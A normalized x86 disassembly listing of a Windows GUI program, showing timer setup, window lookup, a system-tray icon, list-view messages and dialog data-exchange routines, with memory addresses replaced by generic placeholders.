call sub_4225b1
lea ecx [ esp + 0x5c ]
mov [ esp + 0xa8 ] bl
call sub_422478
lea eax [ esp + 0x9c ]
push 0x1
push eax
lea ecx [ esp + 0x1c ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x44 ]
mov [ esp + 0xac ] 0x16
call sub_4225b1
lea ecx [ esp + 0x9c ]
mov [ esp + 0xa8 ] bl
call sub_422478
push 0x1
push 0x55
lea ecx [ esp + 0x70 ]
call sub_41d6f2
mov ecx [ esp + 0x68 ]
mov edx [ esp + 0x40 ]
push ecx
push edx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x68 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
lea eax [ edx * 8 ]
sub eax edx
shl eax 0x2
cmp [ eax + rw-data ] esi
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov esi eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ rw-data ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
lea edx [ esp + 0x5c ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x70 ]
mov [ esp + 0xac ] 0x1a
call sub_4225b1
lea ecx [ esp + 0x54 ]
mov [ esp + 0xa8 ] bl
call sub_422478
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
lea ecx [ esp + 0x5c ]
push rw-data
push ecx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x68 ]
mov [ esp + 0xac ] 0x1b
call sub_4225b1
lea ecx [ esp + 0x54 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov edx [ esp + 0x6c ]
mov [ esp + 0x28 ] esi
mov [ esp + 0x2c ] esi
mov al [ edx ]
mov [ esp + 0x54 ] al
mov ecx [ esp + 0x54 ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_41d726
push 0x1
push 0x35
lea ecx [ esp + 0x20 ]
call sub_41d6f2
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x18 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
lea eax [ edx + 0x1 ]
mov esi 0x186a0
cdq
idiv esi
cmp edx ecx
jne r-xdata
mov [ eax + rw-data ] edi
push 0x1
push 0x44
lea ecx [ esp + 0x68 ]
call sub_41d6f2
mov eax [ esp + 0x60 ]
mov ecx [ esp + 0x40 ]
push eax
push ecx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x60 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ esp + 0x48 ] 0x26
mov edx [ rw-data ]
cmp edx ecx
je r-xdata
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
pop ebp
mov [ rw-data ] eax
test eax eax
pop ebx
je r-xdata
lea eax [ edx + 0x1 ]
mov ebp eax
mov [ esp + 0x58 ] eax
cmp ebp ecx
je r-xdata
push 0x1
push 0x38
lea ecx [ esp + 0x20 ]
call sub_41d6f2
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x18 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ esp + 0x3c ] 0x32
push 0x1
push 0x4c
lea ecx [ esp + 0x4c ]
call sub_41d6f2
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x40 ]
push edx
push eax
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x44 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ esp + 0x48 ] 0x28
push 0x1
push 0x1
push sub_4026b0
push 0x1
push 0x64
mov [ rw-data ] 0x1
call [ timeSetEvent@IAT ]
lea ecx [ esp + 0x2c ]
mov [ esp + 0xa0 ] 0x6
call sub_422478
lea ecx [ esp + 0x5c ]
mov [ esp + 0xa0 ] 0x5
call sub_422478
lea ecx [ esp + 0x64 ]
mov [ esp + 0xa0 ] 0x4
call sub_422478
lea ecx [ esp + 0x38 ]
mov [ esp + 0xa0 ] 0x3
call sub_422478
lea ecx [ esp + 0xc ]
mov [ esp + 0xa0 ] 0x2
call sub_422478
lea ecx [ esp + 0x48 ]
mov [ esp + 0xa0 ] 0x1
call sub_422478
lea ecx [ esp + 0x14 ]
mov [ esp + 0xa0 ] 0x0
call sub_422478
lea ecx [ esp + 0x18 ]
mov [ esp + 0xa0 ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x98 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x9c
retn
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
cdq
mov esi 0x186a0
idiv esi
cmp edx ecx
jne r-xdata
lea edi [ edx * 8 ]
sub edi edx
shl edi 0x2
push 0x1
push 0x31
lea ecx [ esp + 0x20 ]
call sub_41d6f2
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x18 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ esp + 0x3c ] 0x50
push 0x1
push 0x52
lea ecx [ esp + 0x54 ]
call sub_41d6f2
mov ecx [ esp + 0x4c ]
mov edx [ esp + 0x40 ]
push ecx
push edx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x4c ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ esp + 0x48 ] 0x25
neg eax
sub eax 0x20
jmp r-xdata
lea edx [ eax * 8 ]
sub edx eax
mov eax [ edi + rw-data ]
cmp eax [ edx * 4 + rw-data ]
jle r-xdata
lea eax [ ebp - 0x186a0 ]
mov edx [ esp + 0x64 ]
movsx eax [ edx ]
sub eax 0x20
mov edx [ esp + 0x24 ]
mov [ esp + 0x30 ] eax
mov eax [ rw-data ]
lea ecx [ eax * 8 ]
sub ecx eax
lea esi [ ecx * 4 + rw-data ]
mov [ esi ] edx
mov eax [ esp + 0x28 ]
mov [ esi + 0x4 ] eax
mov ecx [ esp + 0x2c ]
mov [ esi + 0x8 ] ecx
mov edx [ esp + 0x30 ]
lea eax [ esp + 0x34 ]
lea ecx [ esi + 0x10 ]
push eax
mov [ esi + 0xc ] edx
call sub_4225b1
mov ecx [ esp + 0x38 ]
xor edi edi
mov [ esi + 0x14 ] ecx
mov edx [ esp + 0x3c ]
mov [ esi + 0x18 ] edx
mov eax [ rw-data ]
inc eax
mov ecx 0x186a0
cdq
idiv ecx
mov ecx edx
mov edx [ rw-data ]
dec edx
mov [ rw-data ] ecx
test edx edx
jle r-xdata
mov [ esp + 0x3c ] ebp
push 0x1
push 0x49
lea ecx [ esp + 0x20 ]
call sub_41d6f2
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x40 ]
push eax
push ecx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x18 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ esp + 0x48 ] 0x27
mov [ esp + 0x28 ] eax
mov [ rw-data ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
lea eax [ eax + eax * 4 ]
shl eax 0x1
mov [ rw-data ] eax
lea eax [ ebp + 0x1 ]
mov esi 0x186a0
cdq
idiv esi
mov ebp edx
cmp ebp ecx
jne r-xdata
mov ecx [ rw-data ]
mov [ esp + 0x80 ] ecx
mov eax [ edi + rw-data ]
mov edx [ edi + rw-data ]
mov ecx [ edi + rw-data ]
mov [ esp + 0x74 ] eax
mov [ esp + 0x70 ] edx
mov edx [ edi + rw-data ]
lea eax [ edi + rw-data ]
mov [ esp + 0x78 ] ecx
push eax
lea ecx [ esp + 0x84 ]
mov [ esp + 0xac ] 0x1c
mov [ esp + 0x80 ] edx
call sub_4225b1
mov ecx [ edi + rw-data ]
mov edx [ edi + rw-data ]
lea eax [ ebp * 8 ]
mov [ esp + 0x84 ] ecx
sub eax ebp
mov [ esp + 0x88 ] edx
mov ecx [ eax * 4 + rw-data ]
lea esi [ eax * 4 + rw-data ]
mov [ edi + rw-data ] ecx
mov edx [ esi + 0x4 ]
mov [ edi + rw-data ] edx
mov eax [ esi + 0x8 ]
mov [ edi + rw-data ] eax
mov ecx [ esi + 0xc ]
lea edx [ esi + 0x10 ]
mov [ edi + rw-data ] ecx
push edx
lea ecx [ edi + rw-data ]
call sub_4225b1
mov eax [ esi + 0x14 ]
mov edx [ esp + 0x70 ]
mov [ edi + rw-data ] eax
mov ecx [ esi + 0x18 ]
mov eax [ esp + 0x74 ]
mov [ edi + rw-data ] ecx
mov ecx [ esp + 0x78 ]
mov [ esi + 0x4 ] eax
mov [ esi ] edx
mov edx [ esp + 0x7c ]
lea eax [ esp + 0x80 ]
mov [ esi + 0x8 ] ecx
push eax
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] edx
call sub_4225b1
mov ecx [ esp + 0x84 ]
mov edx [ esp + 0x88 ]
mov [ esi + 0x14 ] ecx
lea ecx [ esp + 0x80 ]
mov [ esi + 0x18 ] edx
mov [ esp + 0xa8 ] bl
call sub_422478
mov ecx [ rw-data ]
mov edx [ rw-data ]
cmp edx ecx
je r-xdata
mov esi rw-data
push 0x0
push rw-data
lea ecx [ esp + 0x1c ]
call sub_41d82f
lea edx [ esp + 0x90 ]
push eax
push edx
lea ecx [ esp + 0x1c ]
call sub_41d7b7
push eax
lea ecx [ esp + 0x44 ]
mov [ esp + 0xac ] 0x17
call sub_4225b1
lea ecx [ esp + 0x90 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov eax [ esp + 0x40 ]
lea ecx [ esp + 0x94 ]
mov eax [ eax - 0x8 ]
dec eax
push eax
push ecx
lea ecx [ esp + 0x48 ]
call sub_41d73b
push eax
lea ecx [ esp + 0x44 ]
mov [ esp + 0xac ] 0x18
call sub_4225b1
lea ecx [ esp + 0x94 ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov edx [ esp + 0x40 ]
push edx
call sub_410877
add esp 0x4
mov ebp eax
mov eax [ esp + 0x14 ]
lea ecx [ esp + 0x14 ]
push 0x0
push rw-data
mov esi [ eax - 0x8 ]
call sub_41d82f
sub esi eax
lea ecx [ esp + 0x8c ]
dec esi
push esi
push ecx
lea ecx [ esp + 0x1c ]
call sub_41d73b
push eax
lea ecx [ esp + 0x44 ]
mov [ esp + 0xac ] 0x19
call sub_4225b1
lea ecx [ esp + 0x8c ]
mov [ esp + 0xa8 ] bl
call sub_422478
mov edx [ esp + 0x40 ]
push edx
call sub_410877
mov [ esp + 0x9c ] eax
mov eax [ esp + 0x4c ]
mov [ esp + 0x34 ] eax
mov eax [ rw-data ]
mov edx [ esp + 0x28 ]
add esp 0x4
lea ecx [ eax * 8 ]
add edi ebp
sub ecx eax
mov [ esp + 0x28 ] edi
lea esi [ ecx * 4 + rw-data ]
mov [ esi ] edx
mov eax [ esp + 0x28 ]
mov [ esi + 0x4 ] eax
mov ecx [ esp + 0x2c ]
mov [ esi + 0x8 ] ecx
mov edx [ esp + 0x30 ]
mov [ esi + 0xc ] edx
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esi + 0x10 ]
call sub_4225b1
mov ecx [ esp + 0x38 ]
mov [ esi + 0x14 ] ecx
mov edx [ esp + 0x3c ]
mov [ esi + 0x18 ] edx
mov eax [ rw-data ]
inc eax
mov ecx 0x186a0
cdq
idiv ecx
mov ecx edx
mov edx [ esp + 0x98 ]
mov [ rw-data ] ecx
lea eax [ edx - 0x1 ]
test eax eax
jle r-xdata
mov [ esp + 0x48 ] 0xbc
cmp ebp 0x186a0
mov eax ebp
jle r-xdata
mov eax [ esp + 0x58 ]
push 0x1
push 0x38
lea ecx [ esp + 0x54 ]
call sub_41d6f2
mov edx [ esp + 0x4c ]
mov eax [ esp + 0x14 ]
push edx
push eax
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x4c ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ esp + 0x3c ] 0x32
mov edx [ esp + 0x58 ]
mov eax [ esp + 0x54 ]
cmp edx eax
jl r-xdata
mov ebp eax
push 0x1
push 0x31
lea ecx [ esp + 0x4c ]
call sub_41d6f2
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x14 ]
push ecx
push edx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x44 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
mov [ esp + 0x3c ] 0x50
jmp r-xdata
mov eax [ esp + 0x48 ]
lea edx [ ecx * 8 ]
sub edx ecx
inc edi
mov [ esp + 0x30 ] eax
mov eax [ esp + 0x24 ]
lea esi [ edx * 4 + rw-data ]
mov [ esp + 0x28 ] edi
mov [ esi ] eax
mov ecx [ esp + 0x28 ]
mov [ esi + 0x4 ] ecx
mov edx [ esp + 0x2c ]
lea ecx [ esp + 0x34 ]
mov [ esi + 0x8 ] edx
mov eax [ esp + 0x30 ]
push ecx
lea ecx [ esi + 0x10 ]
mov [ esi + 0xc ] eax
call sub_4225b1
mov edx [ esp + 0x38 ]
mov [ esi + 0x14 ] edx
mov eax [ esp + 0x3c ]
mov [ esi + 0x18 ] eax
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
mov ecx 0x186a0
cdq
idiv ecx
dec ebp
mov ecx edx
mov [ rw-data ] ecx
jne r-xdata
mov eax [ esp + 0x64 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x28 ]
movsx eax [ eax + edi + 0x1 ]
mov [ esi - 0x8 ] ecx
mov ecx [ esp + 0x2c ]
mov [ esi - 0x4 ] edx
lea edx [ esp + 0x34 ]
sub eax 0x20
mov [ esi ] ecx
push edx
lea ecx [ esi + 0x8 ]
mov [ esp + 0x34 ] eax
mov [ esi + 0x4 ] eax
call sub_4225b1
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x3c ]
mov edx [ rw-data ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] ecx
inc edi
add esi 0x1c
dec edx
cmp edi edx
jl r-xdata
mov [ esp + 0x3c ] ebp
mov edx [ rw-data ]
cmp edx ecx
je r-xdata
mov eax [ esp + 0x6c ]
mov cl [ eax + edi + 0x1 ]
mov [ esp + 0x54 ] cl
mov edx [ esp + 0x54 ]
push edx
lea ecx [ esp + 0x18 ]
call sub_41d726
push 0x1
push 0x35
lea ecx [ esp + 0x20 ]
call sub_41d6f2
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_41051e
add esp 0x8
lea ecx [ esp + 0x18 ]
test eax eax
sete [ esp + 0x13 ]
call sub_422478
mov al [ esp + 0x13 ]
test al al
je r-xdata
sub_404810
mov eax [ rw-data ]
push esi
test eax eax
mov esi ecx
jne r-xdata
push 0x0
mov ecx eax
call sub_421b8c
pop esi
retn
push rw-data
push eax
call [ FindWindowA@IAT ]
push eax
call sub_41f3e7
test eax eax
mov [ rw-data ] eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_420904
pop esi
retn
sub_404860
mov eax [ rw-data ]
push esi
test eax eax
mov esi ecx
jne r-xdata
push 0x5
mov ecx eax
call sub_421b8c
pop esi
retn
push rw-data
push eax
call [ FindWindowA@IAT ]
push eax
call sub_41f3e7
test eax eax
mov [ rw-data ] eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_420904
pop esi
retn
sub_4048b0
push 0xffffffff
push sub_42a548
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x5c
push 0x0
lea ecx [ esp + 0x4 ]
call sub_401760
lea ecx [ esp ]
mov [ esp + 0x64 ] 0x0
call sub_41eac9
lea ecx [ esp ]
mov [ esp + 0x64 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x5c ]
mov [ fs : 0x0 ] ecx
add esp 0x68
retn
sub_404910
sub esp 0x58
push ebx
mov ebx ecx
push esi
push edi
mov eax [ ebx + 0x1c ]
mov [ esp + 0xc ] 0x58
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x80
mov [ esp + 0x18 ] 0x7
mov [ esp + 0x1c ] 0x464
call sub_4272f7
call sub_4272f7
mov eax [ eax + 0xc ]
push 0x80
push eax
call [ LoadIconA@IAT ]
mov [ esp + 0x20 ] eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x24 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
push ecx
push 0x0
call [ Shell_NotifyIconA@IAT ]
push 0x0
mov ecx ebx
call sub_421b8c
pop edi
pop esi
pop ebx
add esp 0x58
retn
sub_4049c0
sub esp 0x58
push esi
mov esi ecx
call sub_41fad6
mov eax [ esi + 0x1c ]
lea ecx [ esp + 0x4 ]
push ecx
push 0x2
mov [ esp + 0xc ] 0x58
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x80
call [ Shell_NotifyIconA@IAT ]
pop esi
add esp 0x58
retn
sub_404ae0
push 0xffffffff
push sub_42a568
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push esi
push edi
mov esi ecx
push eax
push 0x99
mov [ esp + 0x10 ] esi
call sub_41ea14
lea edi [ esi + 0x5c ]
mov [ esp + 0x14 ] 0x0
mov ecx edi
call sub_41efc6
mov ecx [ esp + 0xc ]
mov [ edi ] r--data
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_404b60
push 0xffffffff
push sub_42a588
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push esi
mov esi ecx
mov [ esp + 0x4 ] esi
lea ecx [ esi + 0x5c ]
mov [ esp + 0x10 ] 0x0
call sub_41dd6c
mov ecx esi
mov [ esp + 0x10 ] 0xffffffff
call sub_41e7a7
mov ecx [ esp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
sub_404be0
push 0xffffffff
push sub_42a5b8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x54
push ebx
push ebp
push esi
push edi
mov edi ecx
call sub_41ed51
mov eax [ rw-data ]
mov [ esp + 0x10 ] eax
xor esi esi
mov [ esp + 0x14 ] eax
mov [ esp + 0x6c ] esi
mov ecx [ edi + 0x78 ]
mov ebp [ SendMessageA@IAT ]
lea eax [ esp + 0x1c ]
mov [ esp + 0x6c ] 0x1
push eax
push esi
push 0x101b
push ecx
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x54 ] esi
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x30 ] 0x2
mov [ esp + 0x40 ] esi
mov [ esp + 0x34 ] 0xfa
mov [ esp + 0x38 ] rw-data
call ebp
call sub_4272f7
mov eax [ eax + 0x4 ]
push esi
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov ebx eax
xor eax eax
cmp ebx esi
jle r-xdata
lea ecx [ esp + 0x14 ]
mov [ esp + 0x6c ] 0x0
call sub_422478
lea ecx [ esp + 0x10 ]
mov [ esp + 0x6c ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x64 ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x60
retn
lea esi [ eax + 0x1 ]
lea edx [ esp + 0x14 ]
push esi
push rw-data
push edx
call sub_41dba7
add esp 0xc
call sub_4272f7
mov ecx [ esp + 0x14 ]
mov eax [ eax + 0x4 ]
push 0x0
push ecx
lea edx [ esp + 0x20 ]
push rw-data
push edx
mov ecx eax
call sub_426e5d
push eax
lea ecx [ esp + 0x14 ]
mov [ esp + 0x70 ] 0x2
call sub_4225b1
lea ecx [ esp + 0x18 ]
mov [ esp + 0x6c ] 0x1
call sub_422478
mov eax [ edi + 0x78 ]
push 0x0
push 0x0
push 0x1004
push eax
call ebp
mov ecx [ esp + 0x10 ]
mov [ esp + 0x40 ] eax
mov eax [ ecx - 0x8 ]
lea ecx [ esp + 0x10 ]
push eax
call sub_422745
lea edx [ esp + 0x3c ]
mov [ esp + 0x50 ] eax
mov eax [ edi + 0x78 ]
push edx
push 0x0
push 0x1007
push eax
call ebp
mov eax esi
cmp eax ebx
jl r-xdata
sub_404d60
push ebx
mov ebx [ esp + 0x8 ]
push edi
mov edi ecx
cmp [ ebx + 0x4 ] 0x100
jne r-xdata
push ebx
mov ecx edi
call sub_41e66d
pop edi
pop ebx
retn 0x4
cmp [ ebx + 0x8 ] 0x2e
jne r-xdata
lea eax [ edi + 0x5c ]
test eax eax
je r-xdata
push esi
mov esi [ SendMessageA@IAT ]
push 0x2
push 0xffffffff
push 0x100c
push eax
call esi
push 0x0
push eax
mov eax [ edi + 0x78 ]
push 0x1008
push eax
call esi
pop esi
mov eax [ eax + 0x1c ]
sub_404db0
push 0xffffffff
push sub_42a5f1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xcc
mov eax [ rw-data ]
push esi
push edi
mov esi ecx
mov [ esp + 0x8 ] eax
push 0x0
lea ecx [ esp + 0x38 ]
mov [ esp + 0xe0 ] 0x0
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x18 ] 0x0
call sub_401000
lea ecx [ esp + 0x34 ]
mov [ esp + 0xdc ] 0x1
call sub_41eac9
mov edi [ SendMessageA@IAT ]
cmp eax 0x1
jne r-xdata
mov edx [ esi + 0x78 ]
push 0x0
push 0x0
push 0x1004
push edx
call edi
dec eax
push 0x1
push eax
mov eax [ esi + 0x78 ]
push 0x1013
push eax
call edi
lea ecx [ esp + 0x94 ]
mov [ esp + 0xdc ] 0x2
call sub_426127
lea ecx [ esp + 0x34 ]
mov [ esp + 0xdc ] 0x0
call sub_41e7a7
lea ecx [ esp + 0x8 ]
mov [ esp + 0xdc ] 0xffffffff
call sub_422478
mov ecx [ esp + 0xd4 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0xd8
retn
mov ecx [ esp + 0xd0 ]
mov edx [ esp + 0x90 ]
push ecx
push edx
lea eax [ esp + 0x10 ]
push rw-data
push eax
call sub_41dba7
mov ecx [ esi + 0x78 ]
add esp 0x10
push 0x0
push 0x0
push 0x1004
push ecx
call edi
mov edx [ esp + 0x8 ]
mov [ esp + 0x10 ] eax
lea ecx [ esp + 0x8 ]
mov eax [ edx - 0x8 ]
push eax
call sub_422745
mov ecx [ esi + 0x78 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0xc ]
push eax
push 0x0
push 0x1007
push ecx
call edi
sub_404ef0
push esi
push edi
mov edi ecx
lea eax [ edi + 0x5c ]
test eax eax
je r-xdata
mov esi [ SendMessageA@IAT ]
push 0x2
push 0xffffffff
push 0x100c
push eax
call esi
cmp eax 0xffffffff
push 0x0
jne r-xdata
mov eax [ eax + 0x1c ]
push eax
mov eax [ edi + 0x78 ]
push 0x1008
push eax
call esi
pop edi
pop esi
retn
push rw-data
push rw-data
mov ecx edi
call sub_420904
pop edi
pop esi
retn
sub_404f40
push 0xffffffff
push sub_42a610
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
mov eax [ rw-data ]
push ebx
push ebp
push esi
mov ebp ecx
mov [ esp + 0xc ] eax
mov ecx [ ebp + 0x78 ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x1004
push ecx
mov [ esp + 0x2c ] 0x0
call ebx
mov esi eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push esi
push rw-data
push rw-data
mov ecx eax
call sub_425a5f
mov edx [ ebp + 0x78 ]
xor esi esi
push esi
push esi
push 0x1004
push edx
call ebx
test eax eax
jle r-xdata
mov ecx ebp
call sub_41edb6
lea ecx [ esp + 0xc ]
mov [ esp + 0x1c ] 0xffffffff
call sub_422478
mov ecx [ esp + 0x14 ]
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x14
retn
push edi
lea edi [ esi + 0x1 ]
lea eax [ esp + 0x10 ]
push edi
push rw-data
push eax
call sub_41dba7
add esp 0xc
lea ecx [ esp + 0x14 ]
push 0x0
push esi
push ecx
lea ecx [ ebp + 0x5c ]
call sub_41dda4
mov esi [ eax ]
mov [ esp + 0x20 ] 0x1
call sub_4272f7
mov edx [ esp + 0x10 ]
mov eax [ eax + 0x4 ]
push esi
push edx
push rw-data
mov ecx eax
call sub_425ad4
lea ecx [ esp + 0x14 ]
mov [ esp + 0x20 ] 0x0
call sub_422478
mov eax [ ebp + 0x78 ]
push 0x0
push 0x0
push 0x1004
push eax
mov esi edi
call ebx
cmp esi eax
jl r-xdata
pop edi
sub_405070
push 0xffffffff
push sub_42a64f
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi ecx
push eax
push 0x83
mov [ esp + 0x14 ] esi
call sub_41ea14
lea ebx [ esi + 0x5c ]
xor edi edi
mov ecx ebx
mov [ esp + 0x18 ] edi
call sub_41efc6
mov [ ebx ] r--data
lea ebx [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
mov ecx ebx
call sub_41efc6
mov [ ebx ] r--data
lea ebx [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
mov ecx ebx
call sub_41efc6
mov [ ebx ] r--data
lea ebx [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
mov ecx ebx
call sub_41efc6
mov ecx [ esp + 0x10 ]
mov [ ebx ] r--data
mov [ esi + 0x14c ] edi
mov [ esi + 0x150 ] edi
mov [ esi + 0x154 ] edi
mov [ esi + 0x158 ] edi
mov [ esi + 0x15c ] edi
mov [ esi + 0x160 ] edi
mov [ esi + 0x164 ] edi
mov [ esi + 0x168 ] edi
mov [ esi + 0x16c ] edi
mov [ esi + 0x170 ] edi
mov [ esi + 0x174 ] edi
mov [ esi + 0x178 ] edi
mov [ esi + 0x17c ] edi
mov [ esi ] r--data
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_405190
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x410
push edi
call sub_425678
lea ecx [ esi + 0x98 ]
push ecx
push 0x40e
push edi
call sub_425678
lea edx [ esi + 0xd4 ]
push edx
push 0x40f
push edi
call sub_425678
lea eax [ esi + 0x110 ]
push eax
push 0x3ff
push edi
call sub_425678
lea ecx [ esi + 0x14c ]
push ecx
push 0x3fa
push edi
call sub_4255a5
lea edx [ esi + 0x150 ]
push edx
push 0x405
push edi
call sub_4255a5
lea eax [ esi + 0x154 ]
push eax
push 0x3f7
push edi
call sub_4255a5
lea ecx [ esi + 0x158 ]
push ecx
push 0x403
push edi
call sub_4255a5
lea edx [ esi + 0x15c ]
push edx
push 0x40d
push edi
call sub_4255a5
lea eax [ esi + 0x160 ]
push eax
push 0x402
push edi
call sub_4255a5
lea ecx [ esi + 0x164 ]
push ecx
push 0x3f8
push edi
call sub_4255a5
lea edx [ esi + 0x168 ]
push edx
push 0x404
push edi
call sub_4255a5
lea eax [ esi + 0x16c ]
push eax
push 0x3f3
push edi
call sub_425626
lea ecx [ esi + 0x170 ]
push ecx
push 0x3f1
push edi
call sub_425626
lea edx [ esi + 0x174 ]
push edx
push 0x408
push edi
call sub_425626
lea eax [ esi + 0x178 ]
push eax
push 0x3f0
push edi
call sub_425626
add esi 0x17c
push esi
push 0x3f2
push edi
call sub_425626
pop edi
pop esi
retn 0x4
sub_4052e0
push esi
mov esi ecx
call sub_41ed51
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x15c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x154 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x164 ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
mov [ esi + 0x14c ] eax
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
jl r-xdata
sub eax 0x27
sub eax 0x61
jmp r-xdata
sub eax 0x27
sub eax 0x61
jmp r-xdata
push edi
mov edi [ SendMessageA@IAT ]
push 0x0
push eax
mov eax [ esi + 0xb4 ]
push 0x14e
push eax
call edi
call sub_4272f7
mov eax [ eax + 0x4 ]
push 0x0
push rw-data
push rw-data
mov ecx eax
call sub_426df1
cmp eax 0x61
